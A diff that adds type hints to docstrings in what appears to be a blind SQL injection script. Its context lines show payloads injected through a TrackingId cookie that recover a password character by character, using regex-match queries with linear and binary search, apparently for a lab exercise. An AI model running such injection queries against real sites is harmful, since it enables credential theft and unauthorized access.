@@ -24,9 +24,9 @@ def IsValid(resp):
     Checks if the website returns a valif HTTP response code.
 
     Args:
-        resp: the response code given to analyze
+        resp(str): the response code given to analyze
     Returns:
-        True/False: If the response code is in 200, then true
+        True/False(boolean): If the response code is in 200, then true
     """
     if resp.status_code >= 200 and resp.status_code < 300:
         return True
@@ -39,10 +39,10 @@ def TryQuery(query):
     Performs/Parses the data returned to determine if the request is valid
 
     args:
-        query: the test query to be run
+        query(str): the test query to be run
     
     returns:
-        true/false: depending on if the test was successful
+        true/false(boolean): depending on if the test was successful
     """
     #print(f'Query: {query}')
     mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
@@ -95,8 +95,8 @@ def LinearSearch(arr, password_length):
         and uses that as a bound.
 
     Args:
-        arr:the test set of characters used to find password
-        password_length: the total length of the suspect
+        arr(str):the test set of characters used to find password
+        password_length(int): the total length of the suspect
     """
     for i in range(len(characters)):
         query1 = f"{query_pass} ~ '^{characters[i]}'--"
@@ -124,10 +124,10 @@ def GetMatch(try_password):
     Performs a test query to see if the password matches
 
     Args:
-        try_pass: is the password variable used to store
+        try_pass(str): is the password variable used to store
                     already found portion of the password
     Returns: 
-        True/False depending on if the query is correct    
+        True/False(boolean): depending on if the query is correct    
     """ 
     query = f"{query_pass} ~ '^{try_password}$'--"
     if TryQuery(query) == True:
@@ -143,11 +143,11 @@ def BinarySearchRec(try_pass, arr, high_point, low_point):
 
     This is is recursive portion for the BinarySearch function
     Args:
-        try_pass: is the password variable used to store
+        try_pass(str): is the password variable used to store
                     already found portion of the password
-        arr: the test set of characters used to find password
-        high_point: the upper bound for the binary search
-        low_point: the lower bound of the binary search
+        arr(str): the test set of characters used to find password
+        high_point(int): the upper bound for the binary search
+        low_point(int): the lower bound of the binary search
               
     """  
     if high_point >= low_point:
@@ -183,7 +183,7 @@ def BinarySearch(arr):
     divides it in half and proceeds to run subqueries 
     until the complete password is found
     Args:
-        arr: takes in an array of potential characters 
+        arr(str): takes in an array of potential characters 
         that the program will use to find the password
               
     """      
